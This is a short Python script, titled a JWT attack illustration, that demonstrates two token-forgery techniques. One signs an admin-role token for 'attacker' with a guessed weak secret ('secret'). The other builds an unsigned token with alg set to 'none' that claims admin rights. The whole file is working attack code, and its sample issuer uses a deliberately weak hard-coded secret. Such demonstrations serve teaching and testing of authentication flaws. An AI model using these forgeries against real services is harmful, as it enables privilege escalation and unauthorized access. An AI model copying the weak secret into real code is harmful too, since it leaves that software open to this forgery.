import jwt
import datetime
import base64, json

SECRET = "secret"
ALGORITHM = "HS256"

def generate_token(username: str, secret: str = SECRET):
    payload = {
        "sub": username,
        "role": "user",
        "exp": datetime.datetime.utcnow() + datetime.timedelta(minutes=30)
    }
    token = jwt.encode(payload, secret, algorithm=ALGORITHM)
    return token

def forge_admin_token(secret_guess: str = SECRET):
    forged_payload = {
        "sub": "attacker",
        "role": "admin",
        "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1)
    }
    token = jwt.encode(forged_payload, secret_guess, algorithm=ALGORITHM)
    return token

def unsigned_token():
    header = {"typ":"JWT","alg":"none"}
    payload = {"sub":"attacker","role":"admin","exp": int((datetime.datetime.utcnow() + datetime.timedelta(hours=1)).timestamp())}
    def b64u(x):
        return base64.urlsafe_b64encode(json.dumps(x).encode()).rstrip(b"=").decode()
    token = f"{b64u(header)}.{b64u(payload)}."
    return token

def main():
    print("JWT Attack Illustration\n")
    legit = generate_token("alice")
    print("Valid token with weak secret:\n", legit, "\n")
    forged = forge_admin_token("secret")
    print("Forged token with role=admin:\n", forged, "\n")
    print("Verification of forged token:")
    try:
        decoded = jwt.decode(forged, SECRET, algorithms=[ALGORITHM])
        print("Decoded claims:", decoded)
    except Exception as e:
        print("Verification failed:", e)
    print("\nUnsigned alg=none token example:")
    print(unsigned_token())

if __name__ == "__main__":
    main()
